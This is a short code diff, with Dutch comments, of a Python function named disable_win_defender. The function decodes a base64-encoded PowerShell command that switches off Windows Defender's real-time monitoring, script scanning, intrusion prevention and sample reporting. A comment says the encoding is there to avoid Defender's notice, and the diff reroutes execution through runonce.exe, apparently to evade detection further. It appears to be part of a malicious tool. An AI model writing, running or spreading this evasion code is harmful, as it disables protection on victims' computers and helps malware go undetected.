@@ -31,8 +31,8 @@ def disable_win_defender():
     disable_cmd_b64 = "U2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZUludHJ1c2lvblByZXZlbnRpb25TeXN0ZW0gJHRydWUgLURpc2FibGVJT0FWUHJvdGVjdGlvbiAkdHJ1ZSAtRGlzYWJsZVJlYWx0aW1lTW9uaXRvcmluZyAgJHRydWUgLURpc2FibGVTY3JpcHRTY2FubmluZyAgJHRydWUgLUVuYWJsZUNvbnRyb2xsZWRGb2xkZXJBY2Nlc3MgRGlzYWJsZWQgLUVuYWJsZU5ldHdvcmtQcm90ZWN0aW9uIEF1ZGl0TW9kZSAtRm9yY2UgLU1BUFNSZXBvcnRpbmcgRGlzYWJsZWQgLVN1Ym1pdFNhbXBsZXNDb25zZW50IE5ldmVyU2VuZA=="
     # We mogen het niet in een variabel opslaan, vind Windows defender niet leuk. Vandaar deze prachtige code. (strip voor de newline char, decode om het bytes object naar string te veranderen, f voor fstring.)
     try:
-        subprocess.call(f"powershell.exe {base64.b64decode(
-            disable_cmd_b64).strip().decode()}", shell=True)
+        subprocess.call(f"runonce.exe \'powershell.exe -Command {base64.b64decode(
+            disable_cmd_b64).strip().decode()}\'", shell=True)
         return "Defender is uitgeschakeld."
     except Exception as e:
         return f"Er ging iets mis: {e}"
